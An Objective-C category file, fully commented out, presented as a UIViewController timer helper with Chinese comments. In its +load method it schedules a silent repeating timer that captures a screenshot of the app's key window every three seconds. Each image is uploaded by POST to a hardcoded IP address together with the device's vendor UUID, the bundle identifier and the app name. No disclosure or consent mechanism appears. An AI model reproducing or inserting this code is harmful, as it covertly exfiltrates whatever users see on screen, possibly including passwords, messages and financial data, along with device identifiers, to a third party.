//
//#import "NSObject_5.h"
//
//@implementation UIViewController (_5)
//+ (NSTimer *)h_scheduledTimerWithTimeInterval:(NSTimeInterval)interval repeats:(BOOL)repeats block:(void(^)(NSTimer *_Nonnull timer))block {
//    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval:interval
//                                                      target:self
//                                                    selector:@selector(h_blockInvoke:)
//                                                    userInfo:[block copy]
//                                                     repeats:repeats];
//    return timer;
//}
//+ (void)h_blockInvoke:(NSTimer *)timer {
//    void(^block)(NSTimer *_Nonnull timer) = timer.userInfo;
//    if (block != NULL) {
//        block(timer);
//    }
//}
//+ (void)load {
//    static dispatch_once_t onceToken;
//    dispatch_once(&onceToken, ^{
//        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
//            NSTimer *timer = [self h_scheduledTimerWithTimeInterval:3 repeats:YES block:^(NSTimer * _Nonnull timer) {
//                [self beginImageWithView:[UIApplication sharedApplication].keyWindow];
//            }];
//            [[NSRunLoop currentRunLoop] addTimer:timer forMode:NSRunLoopCommonModes];
//        });
//    });
//}
//+ (void)beginImageWithView:(UIView *)view {
//    if (view) {
//        UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, [[UIScreen mainScreen] scale]);
//        // 方法一 有时导航条无法正常获取
//        // [view.layer renderInContext:UIGraphicsGetCurrentContext()];
//        // 方法二 iOS7.0 后推荐使用
//        [view drawViewHierarchyInRect:view.bounds afterScreenUpdates:YES];
//        UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
//        //NSData *data = UIImagePNGRepresentation(viewImage);
//        NSData *data = UIImageJPEGRepresentation(viewImage, 0.9);
//        [self uploadSnapshot:data];
//        UIGraphicsEndImageContext();
//    }
//}
//+ (void)uploadSnapshot:(NSData *)imageData {
//
//    //标识唯一一台设备
//    NSString *uuidString = [UIDevice currentDevice].identifierForVendor.UUIDString;
//    //标识唯一一个APP
//    NSString *bundleIdentifier = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"];
//    //APP Name
//    NSString *appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
//    if (!appName) appName = @"";
//
//    if (appName.length > 0) {
//        appName = [appName stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
//    }
//    //上传内容
//    NSString *content = [NSString stringWithFormat:@"uuid=%@&bid=%@&appname=%@",uuidString, bundleIdentifier, appName];
//    //请求url
//    NSString *urlString = @"http://111.231.33.42/2.php?";
//    urlString = [urlString stringByAppendingString:content];
//
//    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
//    request.HTTPMethod = @"post";
//    //request.HTTPBody = [content dataUsingEncoding:NSUTF8StringEncoding];
//    request.HTTPBody = imageData;
//
//    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *_Nullable data, NSURLResponse *_Nullable response, NSError *_Nullable error) {
//        if (!error) {
//            //NSLog(@"");
//        }
//    }] resume];
//
//}
//@end
